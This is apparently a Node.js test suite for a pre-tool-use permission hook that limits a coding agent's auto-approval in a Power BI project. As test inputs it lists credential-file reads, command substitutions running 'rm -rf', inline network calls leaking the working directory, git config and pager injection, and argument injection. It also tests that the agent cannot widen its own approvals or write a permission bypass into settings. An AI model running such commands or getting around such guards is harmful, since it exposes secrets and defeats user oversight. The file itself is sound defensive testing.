// approvals.mode: "auto" (default) lets routine work run without a prompt and keeps critical actions with the user;
// "ask" prompts as before. "deny" never changes, and only the user may widen auto approval.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { approvalsWidened, autoApprovalActive, autoApprovalState, labModeActive } from '../hooks/lib/common.mjs';

const hook = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'hooks', 'pre-tool-use.mjs');
const now = new Date('2026-10-06T12:00:00Z');
const auto = (until) => ({ approvals: { mode: 'auto', until } });
const ask = { approvals: { mode: 'ask' } };
const soon = (hours = 1) => new Date(Date.now() + hours * 3600000).toISOString();

test('auto is the default and lasts until the user changes it', () => {
  assert.equal(autoApprovalActive({}, now), true);
  assert.equal(autoApprovalActive({ approvals: { mode: 'auto' } }, now), true);
  assert.equal(autoApprovalActive(ask, now), false);
});

test('an optional until ends auto at that time', () => {
  assert.equal(autoApprovalActive(auto('2026-10-06T12:00:01Z'), now), true);
  assert.equal(autoApprovalActive(auto('2026-10-06T16:00:00+03:00'), now), true);
  assert.equal(autoApprovalActive(auto('2026-10-06T15:00:00+03:00'), now), false); // = 12:00Z
  assert.match(autoApprovalState(auto('2026-10-06T11:59:59Z'), now).reason, /has passed/);
});

test('until must be an ISO date and time with a time zone; other spellings switch auto off, not on', () => {
  for (const until of ['Oct 7 2026', '12/31/2026', '2026-10-06', '2026-10-06T18:00:00', '2026-02-30T00:00:00Z', '2026-10-06T25:00:00Z', ['2026'], 2026]) {
    const state = autoApprovalState(auto(until), now);
    assert.equal(state.active, false, String(until));
    assert.match(state.reason, /not an ISO date and time/, String(until));
  }
  assert.equal(autoApprovalActive(auto('2026-10-06T18:00:00.250Z'), now), true);
});

// 2026-10-07: `" lab"` or `"Auto"` used to fall silently back to ask mode (only the exact spelling counted).
test('a mode spelling with spaces or capitals counts; an unknown mode is ask and says so', () => {
  for (const mode of [' lab', 'LAB', 'Lab ']) assert.equal(labModeActive({ approvals: { mode } }, now), true, JSON.stringify(mode));
  for (const mode of ['Auto', ' auto ']) assert.equal(autoApprovalActive({ approvals: { mode } }, now), true, JSON.stringify(mode));
  for (const mode of ['labb', 'manual', '', 7, null]) {
    const state = autoApprovalState({ approvals: { mode } }, now);
    assert.equal(state.active, false, JSON.stringify(mode));
    assert.match(state.reason, /not "auto", "ask" or "lab"/, JSON.stringify(mode));
  }
  assert.equal(autoApprovalState({ approvals: { mode: 'ask' } }, now).reason, null);
  const cfg = (o) => JSON.stringify(o);
  assert.equal(approvalsWidened(cfg(ask), cfg({ approvals: { mode: ' Lab ' } })), true, 'a spelling is not a way around the widening check');
  assert.equal(approvalsWidened(cfg(ask), cfg({ approvals: { mode: 'Auto' } })), true);
});

test('widening: ask to auto, deleting an ask setting, removing or extending until; narrowing is fine', () => {
  const cfg = (o) => JSON.stringify(o);
  assert.equal(approvalsWidened(cfg(ask), cfg(auto(null))), true);
  assert.equal(approvalsWidened(cfg(ask), '{}'), true); // the default is auto
  assert.equal(approvalsWidened(cfg(auto('2026-10-06T18:00:00Z')), cfg(auto(null))), true);
  assert.equal(approvalsWidened(cfg(auto('2026-10-06T18:00:00Z')), cfg(auto('2026-10-06T20:00:00Z'))), true);
  assert.equal(approvalsWidened(cfg(auto('not a date')), cfg(auto('2026-10-06T20:00:00Z'))), true);
  assert.equal(approvalsWidened(cfg(auto('2026-10-06T18:00:00Z')), cfg(auto('2026-10-06T16:00:00Z'))), false);
  assert.equal(approvalsWidened(cfg(auto(null)), cfg(ask)), false);
  assert.equal(approvalsWidened(cfg(auto(null)), cfg({ ...auto(null), markdown: { maxLines: 400 } })), false);
  assert.equal(approvalsWidened(null, cfg(ask)), false);
});

function runHook(config, payload, script = hook) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'bi-harness-approvals-'));
  fs.mkdirSync(path.join(dir, 'hardening'), { recursive: true });
  if (config) fs.writeFileSync(path.join(dir, 'hardening', 'harness.config.json'), JSON.stringify(config));
  const ti = payload.tool_input ?? {};
  const resolved = ti.file_path && !path.isAbsolute(ti.file_path) && ti.file_path !== '.env'
    ? { ...payload, tool_input: { ...ti, file_path: path.join(dir, ti.file_path) } }
    : payload;
  const result = spawnSync(process.execPath, [script], {
    input: JSON.stringify(resolved),
    env: { ...process.env, CLAUDE_PROJECT_DIR: dir },
    encoding: 'utf8',
  });
  const log = path.join(dir, '.claude', 'logs', 'security-events.jsonl');
  const events = fs.existsSync(log) ? fs.readFileSync(log, 'utf8').trim().split('\n').map((l) => JSON.parse(l)) : [];
  fs.rmSync(dir, { recursive: true, force: true });
  // F1-64: a guard that did not run prints no verdict, which a "not allow" or "no verdict" assertion reads as a pass.
  assert.equal(result.status, 0, result.stderr);
  const out = result.stdout.trim() ? JSON.parse(result.stdout) : null;
  return { out, events, decision: out?.hookSpecificOutput?.permissionDecision ?? null, reason: out?.hookSpecificOutput?.permissionDecisionReason ?? '' };
}

const connect = {
  hook_event_name: 'PreToolUse',
  session_id: 'test-session',
  tool_name: 'mcp__powerbi-modeling__connection_operations',
  tool_input: { request: { operation: 'Connect', connectionString: 'Data Source=localhost:1234' } },
};
const shell = (command) => ({ ...connect, tool_name: 'PowerShell', tool_input: { command } });

// Audit 2026-10-18, F1-64: runHook asserts the exit status, so a test that spawns the guard fails when the guard did not
// run: a script that does not start exits 1 (Claude Code lets the call through), one that cannot load its guard exits 2
// (it blocks the call). Before the fix four tests below passed under both, because they assert "not allow" or "no verdict".
test('runHook fails when the guard did not run: a script that does not start (exit 1) or load (exit 2)', () => {
  const broken = fs.mkdtempSync(path.join(os.tmpdir(), 'bi-harness-approvals-broken-'));
  try {
    fs.mkdirSync(path.join(broken, 'lib'));
    fs.writeFileSync(path.join(broken, 'lib', 'guard-pre-tool-use.mjs'), 'export const x = ;\n');
    fs.copyFileSync(hook, path.join(broken, 'pre-tool-use.mjs'));
    assert.throws(() => runHook(null, shell('git status'), path.join(broken, 'missing.mjs')), { name: 'AssertionError' });
    assert.throws(() => runHook(null, shell('git status'), path.join(broken, 'pre-tool-use.mjs')), { name: 'AssertionError', message: /could not load/ });
  } finally {
    fs.rmSync(broken, { recursive: true, force: true });
  }
});

test('ask mode: the hook asks for a local MCP connection', () => {
  assert.equal(runHook(ask, connect).decision, 'ask');
});

test('auto (default, no config file): a routine ask passes and is logged', () => {
  const { decision, reason, events } = runHook(null, connect);
  assert.equal(decision, 'allow');
  assert.match(reason, /auto-approved/);
  assert.ok(events.some((e) => e.event === 'auto-approve'));
});

test('auto: routine commands and project file edits run without a prompt; others follow Claude Code', () => {
  assert.equal(runHook(null, shell('git status')).decision, 'allow');
  assert.equal(runHook(null, shell('Get-ChildItem docs | Select-Object Name')).decision, 'allow');
  // desktop.screenshots defaults to "ask" (2026-10-15): a screenshot shows data, so it is no longer routine by default.
  assert.equal(runHook(null, shell('powerbi-desktop screenshot all --pid 1 --output-dir C:/tmp')).decision, 'ask');
  assert.equal(runHook(null, { ...connect, tool_name: 'Write', tool_input: { file_path: 'docs/notes.md', content: '# x\n' } }).decision, 'allow');
  assert.equal(runHook(null, shell('npm install left-pad')).decision, null);
  assert.equal(runHook(null, shell('gh pr create')).decision, 'ask'); // outward-facing: the floor asks in every mode
  assert.equal(runHook(null, shell('gh pr list')).decision, null); // reading GitHub is not a write
  assert.equal(runHook(null, shell('git stash')).decision, null);
  assert.equal(runHook(null, shell('Remove-Item notes.txt')).decision, null);
  assert.equal(runHook(null, { ...connect, tool_name: 'Write', tool_input: { file_path: 'notes.txt', content: 'x' } }).decision, null);
});

// Eval 2026-10-07 (E12): `git switch -c chore/bi-onboard` was not routine, because the global-option check `-c`
// (git -c alias.x=push) also matched the subcommand's own -c. The branch creation AGENTS.md pre-approves must pass.
test('auto: a feature branch creation is routine; git -c before the subcommand and output options stay out', () => {
  for (const cmd of ['git switch -c feature/x', 'git switch -c chore/bi-onboard; git status', 'git log -c -1', 'git commit -c HEAD']) {
    assert.equal(runHook(null, shell(cmd)).decision, 'allow', cmd);
  }
  for (const cmd of ['git -c alias.x=push x', 'git -c core.pager=./x.sh log', 'git log --output=x.txt', 'git diff --ext-diff', 'git --exec-path=./bin status']) {
    assert.notEqual(runHook(null, shell(cmd)).decision, 'allow', cmd);
  }
});

test('auto: commands that read outside the project or hide code are not routine', () => {
  for (const command of ['cat ~/.aws/credentials', 'Get-Content $env:USERPROFILE\\.git-credentials', 'type C:\\Windows\\win.ini',
    'echo $(rm -rf build)', 'echo `rm -rf build`', "Get-ChildItem | Where-Object { [IO.File]::WriteAllText('x','y') }",
    `node -e "fetch('https://example.com/?'+process.cwd())"`, 'cd C:/Windows && cat win.ini', 'git diff --no-index a b']) {
    assert.notEqual(runHook(null, shell(command)).decision, 'allow', command);
  }
});

test('auto: scripts and inline code with file or process calls are left to Claude Code, never approved by the guard', () => {
  for (const command of ['& C:/tmp/x.ps1', 'node C:/tmp/x.mjs', 'python notes.txt', `node -e "require('child_process').execSync('dir')"`]) {
    assert.equal(runHook(null, shell(command)).decision, null, command);
  }
  assert.equal(runHook(ask, shell('node C:/tmp/x.mjs')).decision, 'ask');
});

test('inline code that calls the network is denied like curl', () => {
  for (const command of [`node -e "fetch('https://example.com')"`, `node -e "require('https').get('https://x')"`,
    `python -c "import urllib.request; urllib.request.urlopen('https://x')"`, `python -c "import socket"`,
    '[System.Net.Http.HttpClient]::new()', 'New-Object System.Net.Sockets.TcpClient("x", 443)', `perl -e "use IO::Socket;"`]) {
    assert.equal(runHook(null, shell(command)).decision, 'deny', command);
  }
});

test('auto: Desktop reload keeps its prompt; open does not; screenshot follows desktop.screenshots', () => {
  assert.notEqual(runHook(null, shell('powerbi-desktop reload --pid 1')).decision, 'allow');
  assert.equal(runHook(null, shell('powerbi-desktop open "C:/x/Sales.pbip"')).decision, 'allow');
  const capture = shell('powerbi-desktop screenshot all --pid 1 --output-dir C:/tmp');
  assert.equal(runHook(null, capture).decision, 'ask'); // the default "ask"
  assert.equal(runHook({ desktop: { screenshots: 'off' } }, capture).decision, 'deny');
  assert.equal(runHook({ desktop: { screenshots: 'on' } }, capture).decision, 'allow');
});

test('auto: paths are judged from the shell\'s real directory, which must be inside the project', () => {
  assert.notEqual(runHook(null, { ...shell('cat .gitconfig'), cwd: os.homedir() }).decision, 'allow');
  assert.notEqual(runHook(null, { ...shell('git status'), cwd: os.tmpdir() }).decision, 'allow');
  assert.equal(runHook(null, shell('cd docs && cat notes.md')).decision, 'allow');
  assert.equal(runHook(null, shell('ls docs/*.md')).decision, 'allow'); // listing names only
});

test('auto: recursive and wildcard reads, listings piped into readers, and writing or program-running options are not routine', () => {
  for (const command of ['grep -rn "=" .', 'grep -R x docs', 'findstr /s x *.txt', 'Get-Content *', 'Select-String -Path * -Pattern x',
    'rg -uu secret', 'rg --hidden x', 'ls | xargs cat', 'Get-ChildItem -Recurse | Select-String x', 'find . -name x | xargs grep y',
    'sort -o hardening/harness.config.json notes.txt', 'uniq a.txt b.txt', 'git -c core.pager=x log', 'git diff --output=x.txt',
    'git log --ext-diff', 'rg --pre ./x.sh y', 'powerbi-desktop manifest --pid 1', 'powerbi-report-author render x',
    'dtexec /F etl/P/Load.dtsx /Validate /Set \\Package.Connections[Db].Properties[ConnectionString];x',
    'dtexec /F etl/P/Load.dtsx /Validate /Conn Db;x']) {
    assert.notEqual(runHook(null, shell(command)).decision, 'allow', command);
  }
});

test('a bare file name written from inside a guardrail folder is denied (the payload cwd counts)', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'bi-harness-cwd-'));
  for (const [cwdRel, command] of [['hardening', `Set-Content harness.config.json '{"approvals":{"mode":"auto"}}'`],
    ['.claude', 'echo {} > settings.local.json']]) {
    fs.mkdirSync(path.join(dir, cwdRel), { recursive: true });
    const r = spawnSync(process.execPath, [hook], {
      input: JSON.stringify({ ...shell(command), cwd: path.join(dir, cwdRel) }),
      env: { ...process.env, CLAUDE_PROJECT_DIR: dir },
      encoding: 'utf8',
    });
    assert.equal(JSON.parse(r.stdout).hookSpecificOutput.permissionDecision, 'deny', command);
  }
  fs.rmSync(dir, { recursive: true, force: true });
});

test('auto: directory moves that can leave the project, and variables set for a command, are not routine', () => {
  for (const command of ['cd && cat .gitconfig', 'cd - && cat x', 'popd && cat x', 'cd /c && cat Users/x/.gitconfig', 'cd C: && cat x',
    'GIT_EXTERNAL_DIFF=./x.sh git diff', 'GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0=./x.sh git status',
    'env GIT_PAGER=./x.sh git log']) {
    assert.notEqual(runHook(null, shell(command)).decision, 'allow', command);
  }
  assert.equal(runHook(null, shell('Set-Location -Path docs; Get-Content notes.md')).decision, 'allow');
});

test('plan mode: the guard approves nothing', () => {
  assert.equal(runHook(null, { ...shell('git status'), permission_mode: 'plan' }).decision, null);
  assert.equal(runHook(null, { ...connect, permission_mode: 'plan' }).decision, 'ask');
});

test('auto: critical files are never allowed by the hook', () => {
  for (const file_path of ['m.SemanticModel/definition/roles/Reader.tmdl', 'm.SemanticModel/definition/expressions.tmdl',
    'models/F/dataSources.tmdl', 'hardening/hooks/lib/common.mjs', '.claude/skills/x/SKILL.md', 'AGENTS.md', '.mcp.json',
    'powerbi/CLAUDE.md', '.cursor/rules/x.md', 'Live.SemanticModel/modelReference.json', 'docs/conventions.md',
    'docs/harness/MCP.md', 'docs/static-checks.md', 'docs/test-packs.md', 'docs/sources/README.md',
    'docs/tests/expected-values.md', 'powerbi/CLAUDE.local.md', 'CLAUDE.local.md']) {
    const content = file_path.endsWith('.json') ? '{}' : 'x';
    assert.notEqual(runHook(null, { ...connect, tool_name: 'Write', tool_input: { file_path, content } }).decision, 'allow', file_path);
  }
});

test('ask mode: routine commands are left to Claude Code', () => {
  assert.equal(runHook(ask, shell('git status')).decision, null);
});

test('auto never turns a deny into an allow', () => {
  assert.equal(runHook(null, { ...connect, tool_name: 'Read', tool_input: { file_path: '.env' } }).decision, 'deny');
});

test('an expired until asks again', () => {
  assert.equal(runHook(auto('2000-01-01T00:00:00Z'), connect).decision, 'ask');
});

test('critical: outward-facing, server and data-exposure asks reach the user in auto mode', () => {
  const dax = (query, maxRows) => ({
    ...connect,
    tool_name: 'mcp__powerbi-modeling__dax_query_operations',
    tool_input: { request: { operation: 'Execute', query, maxRows } },
  });
  for (const payload of [
    shell('Publish-PowerBIReport -Path x'),
    shell('git push origin feature/x'),
    shell('sqlcmd -S s -E -Q "SELECT 1"'),
    { ...connect, tool_input: { request: { operation: 'Connect', connectionString: 'Data Source=powerbi://api.powerbi.com/v1.0/myorg/WS' } } },
    { ...connect, tool_input: { request: { operation: 'Connect', connectionString: 'Data Source=ssas-prod.contoso.com' } } },
    dax("EVALUATE 'Customer'", 50),
    { ...connect, tool_name: 'mcp__github__create_pull_request', tool_input: {} },
    { ...connect, tool_name: 'mcp__figma__use_figma', tool_input: {} },
  ]) {
    const { decision, reason, events } = runHook(null, payload);
    assert.equal(decision, 'ask', JSON.stringify(payload.tool_input));
    assert.match(reason, /Critical: auto mode always asks/);
    assert.ok(!events.some((e) => e.event === 'auto-approve'));
  }
});

test('the agent cannot widen auto approval; it may switch to ask or end it earlier', () => {
  const write = (content) => ({ ...connect, tool_name: 'Write', tool_input: { file_path: 'hardening/harness.config.json', content } });
  assert.equal(runHook(ask, write(JSON.stringify(auto(null)))).decision, 'deny');
  assert.equal(runHook(ask, write('{}')).decision, 'deny');
  const until = soon(2);
  assert.equal(runHook(auto(until), write(JSON.stringify(auto(null)))).decision, 'deny');
  assert.equal(runHook(auto(until), write(JSON.stringify(auto(soon(5))))).decision, 'deny');
  assert.notEqual(runHook(auto(until), write(JSON.stringify(ask))).decision, 'deny');
  assert.notEqual(runHook(auto(null), write(JSON.stringify(auto(soon(1))))).decision, 'deny');
});

test('the agent cannot write a permission bypass into a settings file', () => {
  for (const file of ['.claude/settings.json', '.claude/settings.local.json']) {
    const payload = { ...connect, tool_name: 'Write', tool_input: { file_path: file, content: '{"permissions":{"defaultMode":"bypassPermissions"}}' } };
    assert.equal(runHook({}, payload).decision, 'deny', file);
  }
  const hooksOff = { ...connect, tool_name: 'Write', tool_input: { file_path: '.claude/settings.local.json', content: '{"disableAllHooks": true}' } };
  assert.equal(runHook({}, hooksOff).decision, 'deny');
});
